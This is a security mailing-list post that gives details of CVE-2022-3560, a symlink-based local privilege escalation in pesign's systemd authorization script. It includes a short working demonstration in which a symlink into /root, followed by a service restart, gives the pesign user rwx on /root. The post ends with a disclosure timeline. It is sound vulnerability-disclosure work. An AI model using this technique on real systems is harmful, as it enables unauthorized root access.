Received: (qmail 15960 invoked by uid 550); 1 Feb 2023 10:06:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 15936 invoked from network); 1 Feb 2023 10:06:01 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1675245949; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=nt83o2nNsJQFqIAcqO4cXEp6UsxBPIS9yFyvgO024cM=;
	b=s7gHIiWmgtQYexROpbFVhdpnJYcouYTvTSCvSYuJFqHS+fimXalycOLinoXAICeRKYan+y
	FodsxhJIZaC2/bInCdxAqXKQ6ZQRUKuFp9dUKkACKUaImMnHyWwk2DlUvtkeObwT3o/A9Z
	BF7GNvSf+dAqFBmh80abKH/TcAq6uCA=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1675245949;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=nt83o2nNsJQFqIAcqO4cXEp6UsxBPIS9yFyvgO024cM=;
	b=MtaKW0RTu5EhfHs9+AcQmO5G852kHNCIiAywg6Opar3oxLRCip0cFi4QrCXP2Gr5XwWkTS
	QTlNMfLjMecRMgCQ==
Date: Wed, 1 Feb 2023 11:05:49 +0100
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <Y9o5fXKqZDxOHbNe@kasco.suse.de>
References: <CAOGQQ29pYOHP2puP-nAzO+Qnbc-OouwnVFpQVY_=OvVo12=Mkw@mail.gmail.com>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="mMZSM2ohlcv93G8R"
Content-Disposition: inline
In-Reply-To: <CAOGQQ29pYOHP2puP-nAzO+Qnbc-OouwnVFpQVY_=OvVo12=Mkw@mail.gmail.com>
Subject: Re: [oss-security] pesign: Local privilege escalation on pesign
 systemd service

--mMZSM2ohlcv93G8R
Content-Type: text/plain; protected-headers=v1; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
Date: Wed, 1 Feb 2023 11:05:49 +0100
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Subject: Re: [oss-security] pesign: Local privilege escalation on pesign
 systemd service

Hi,

On Tue, Jan 31, 2023 at 12:59:19PM -0300, Marco Benatto wrote:
> a local privilege escalation vulnerability was found in pesign. This
> vulnerability has been identified by CVE-2022-3560.

I would like to add some more details about the vulnerability:

The project ships a systemd service file that starts a pesign daemon
instance but also runs a StartPost script:

```
ExecStart=3D/usr/bin/pesign --daemonize
ExecStartPost=3D/usr/libexec/pesign/pesign-authorize
```

This pesign-authorize script is run with root privileges and grants a
dynamic list of users and groups recursively full access to
/etc/pki/pesign*/ and /run/pesign via POSIX access control lists.

The list of users is found in the root controlled files
/etc/pesign/users and /etc/pesign/groups. By default only pesign:pesign
are configured.

# The Vulnerability

Since the pesign-authorize script is run at every start of the pesign
service unit, the directory trees /etc/pki/pesign* and /run/pesign will
already be controlled by the unprivileged pesign:pesign user and group.
The script does not take precautions to prevent symlink attacks being
staged by a compromised unprivileged user account.

A simple demonstration of the attack would be this:

```
root# sudo -u pesign -g pesign ln -s /root /etc/pki/pesign/attack
root# systemctl restart pesign
root# getfactl /root
# file: root/
# owner: root
# group: root
user::rwx
user:pesign:rwx
group::---
group:pesign:rwx
mask::rwx
other::---
```

Therefore in a default configuration of pesign there is a local pesign
user or pesign group to root escalation that can be achieved at every
pesign.service unit start.

I reproduced this on Fedora 35 using pesign version 113 release 18.fc35.

# Timeline

- 2022-10-11: I reported this to secalert@redhat.com  offering
  coordinated disclosure.
- 2022-10-18: RedHat security assigned the CVE for the issue
- 2022-12-21: RedHat security communicated a coordinated release date
  for 2023-01-31.
- 2023-01-27: RedHat security shared the patch with us and informed the
  distros mailing list about issue and the upcoming release
- 2023-01-31: the issue has been published

Cheers

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Security Engineer
https://www.suse.com/security
GPG Key ID: 0x14C405C971923553
=20
SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Ivo Totev, Andrew Myers, Andrew McDonald, Boudien Moer=
man

--mMZSM2ohlcv93G8R
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmPaOX0ACgkQFMQFyXGS
NVMbzw//bBnW9jGu/vJvcZ5s+uM3ntGQhV9pAzIs1LV5Wf1XKA7+worHR/myBA7m
+zwb0KCX0uHoaV7+o5qW1MF7ExHkOzldVwa3ugXBl05RdM9b6pgzjejl7iwC2GvP
+u06sqPu9QODJJRkrT3Fbjuffp8fFj+JcCGk64qe/I8DZnEol3uDHx8wGbUcGE/v
eBT7h1Aq921aoTIDvqY0MjRErwZF20LVYzylKDf1Vk+Ru9J4OLWd6XAuOELAgFfL
cjbP5EgQs/UD105Nyelstf2FHHBetYtkNltWGXfUOzmSVqkxsXe1mMz+qidLsSTJ
HlLawM2R3essee/itbXzmmPkrrMpC3lpb7kpMidFRI36xYpI6NQg15kQlzD+wrJ2
jrLVsn1bwKDxCl7hI+bbTM6segF8L0+JvwtYrvviZ0DQGkjilEG8YkZDD25BQUtW
GJczQkluIHbJRbzDVNpUoqYZDHfLD8kjX49fR3qRAMMiTsASMuvKd2CGXDOStGBN
qWkXiVcd1ALsMwGcwXAZ3ZRW6Z0+lW76ijO0enq+3jiqW56YD90y58xXixyYGknR
JaSY+fymydOJ+ehrS4bTtsicRniZwJXE83hiaXRPy1r83Z8rcr1uBaPox/EJmBh5
TV6asZtwqSlUytCnNU+bbx3TBC+G4NqssuOkefIZZfNcLrDfJi8=
=Dmhv
-----END PGP SIGNATURE-----

--mMZSM2ohlcv93G8R--
